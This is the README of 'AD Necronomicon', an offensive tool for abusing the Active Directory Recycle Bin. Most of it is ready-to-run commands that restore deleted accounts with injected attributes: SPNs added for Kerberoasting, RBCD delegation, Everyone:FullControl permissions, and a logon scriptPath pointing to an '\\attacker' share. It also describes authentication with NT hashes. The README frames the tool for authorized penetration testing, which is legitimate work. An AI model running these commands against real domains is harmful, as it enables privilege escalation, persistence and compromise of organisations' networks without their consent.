# AD Necronomicon
![Python 3 compatible](https://img.shields.io/badge/python-3.x-blue.svg)
![License: MIT](https://img.shields.io/pypi/l/ad-necronomicon.svg)

AD Necronomicon is a Python tool for enumerating and exploiting the Active Directory Recycle Bin. It discovers who can access deleted objects, enumerates the recycle bin contents, and restores deleted objects with attacker-controlled attributes injected atomically during the undelete operation.

Built on [Impacket](https://github.com/blacklanternsecurity/impacket) with Kerberos-first authentication and no NTLM fallback by default.

## How It Works

When the AD Recycle Bin is enabled, deleted objects are preserved with all their attributes intact for a configurable retention period (default 180 days). Objects in this state can be restored via LDAP by removing the `isDeleted` attribute and setting a new `distinguishedName`.

The key insight is that **additional LDAP modifications can be bundled atomically with the restore operation**. This means attributes like `nTSecurityDescriptor`, `servicePrincipalName`, `userAccountControl`, `msDS-AllowedToActOnBehalfOfOtherIdentity`, and others can be injected in the same request that brings the object back to life — the object is never restored in a "clean" state.

### Requirements

Restoring deleted objects requires two rights:

- **Reanimate Tombstones** extended right on the domain root (granted to Domain Admins by default)
- **List Contents** on the Deleted Objects container (to enumerate what's available)

The `enum-access` subcommand identifies which principals hold these rights from a low-privilege perspective.

## Installation

```
pipx install .
```

Or via pip in a virtual environment:

```
pip install .
```

This installs the `necronomicon` command line tool and pulls in all dependencies including the BLS Impacket fork.

## Usage

AD Necronomicon has three subcommands:

### enum-access — Discover Who Can Access the Recycle Bin

Enumerates the Reanimate Tombstones extended right on the domain object and List Contents access on the Deleted Objects container. Runs from a low-privilege account.

```
necronomicon enum-access -d corp.local -u lowpriv -k -dc dc01.corp.local
```

Output includes:
- Whether the AD Recycle Bin is enabled
- Tombstone and deleted object lifetimes
- Principals with the Reanimate Tombstones right
- Principals with List Contents on the Deleted Objects container

Optional: `-o findings.json` to write JSON output.

### enum-bin — Enumerate Deleted Objects

Lists all deleted objects in the Recycle Bin, grouped by type and restorability. Requires List Contents on the Deleted Objects container.

```
necronomicon enum-bin -d corp.local -u admin -k -dc dc01.corp.local
```

Output includes:
- Restorable and recycled objects grouped by type (user, computer, group, OU)
- High-value targets flagged with tags (`privileged_group`, `domain_controller`, `privileged_container`, `parent_deleted`)
- Objects with `description` or `info` fields populated (potential credential exposure)
- Structured JSON output written to `deleted_objects.json` (override with `-o`)

### inject — Restore with Injected Attributes

Restores a deleted object from the Recycle Bin while atomically injecting arbitrary LDAP attribute modifications. Targets are specified by GUID, SID, sAMAccountName, or name.

```
necronomicon inject -d corp.local -u admin -k -dc dc01.corp.local \
  --target victim --set userAccountControl=544 --set pwdLastSet=0
```

#### Attribute injection flags

| Flag | LDAP Operation | Description |
|------|---------------|-------------|
| `--set ATTR=VALUE` | MODIFY_REPLACE | Set an attribute. Repeatable. |
| `--add ATTR=VALUE` | MODIFY_ADD | Add a value to an attribute. Repeatable. |
| `--del ATTR` | MODIFY_DELETE | Remove an attribute. Repeatable. |

Multiple flags can be combined in a single restore to inject several attributes at once.

#### Security descriptor helpers

Binary security descriptors cannot be passed as CLI strings, so convenience flags handle SD construction:

| Flag | Effect |
|------|--------|
| `--sd-everyone` | Sets `nTSecurityDescriptor` to Everyone:FullControl |
| `--sd-principal SID` | Sets `nTSecurityDescriptor` granting FullControl to the specified SID |
| `--sd-rbcd SID` | Sets `msDS-AllowedToActOnBehalfOfOtherIdentity` with an RBCD SD for the specified SID |

#### Additional options

| Flag | Description |
|------|-------------|
| `--target-ou DN` | Override the restore location (required if the original parent OU is also deleted) |
| `--restore-name NAME` | Override the restored object's RDN |

#### Examples

```bash
# Add an SPN for Kerberoasting
necronomicon inject -d corp.local -u admin -k --target svc_sql \
  --add servicePrincipalName=MSSQLSvc/db.corp.local:1433

# RBCD injection
necronomicon inject -d corp.local -u admin -k --target comp$ \
  --sd-rbcd S-1-5-21-...-1234

# Inject Everyone:FullControl DACL
necronomicon inject -d corp.local -u admin -k --target victim \
  --sd-everyone

# Restore into a specific OU with a new name
necronomicon inject -d corp.local -u admin -k --target victim \
  --set scriptPath='\\attacker\share\run.bat' \
  --target-ou 'OU=Servers,DC=corp,DC=local' --restore-name svc_backup

# Combine multiple injections in one restore
necronomicon inject -d corp.local -u admin -k --target victim \
  --set userAccountControl=528384 \
  --add servicePrincipalName=HTTP/web.corp.local \
  --sd-everyone
```

## Authentication

Kerberos is the default and recommended authentication method. NTLM requires an explicit `--auth-method ntlm` flag and is never used as a fallback.

| Method | Flags |
|--------|-------|
| Kerberos with password | `-d corp.local -u user` (prompted for password) |
| Kerberos with ccache | `-d corp.local -u user -k` (reads `KRB5CCNAME`) |
| Kerberos with AES key | `-d corp.local -u user --aeskey <hex>` |
| Kerberos with NT hash | `-d corp.local -u user -H :NTHASH` |
| NTLM (explicit only) | `-d corp.local -u user --auth-method ntlm` |

Additional connection options:

| Flag | Description |
|------|-------------|
| `-dc HOST` | Target DC hostname (auto-discovered via DNS SRV if omitted) |
| `-ns IP` | DNS server to use for resolution |
| `--ldaps` | Use LDAPS (port 636) |
| `--channel-binding` | Use LDAP channel binding |
| `--dns-tcp` | Use TCP for DNS queries |
| `-v` | Verbose/debug output |

## Credits

AD Necronomicon was written by [Black Lantern Security](https://www.blacklanternsecurity.com). The authentication and LDAP implementation is based on [BloodHound.py](https://github.com/dirkjanm/BloodHound.py) by Dirk-jan Mollema.

## Disclaimer

This tool is for authorized security testing only. Use responsibly and only on systems you have explicit permission to test.
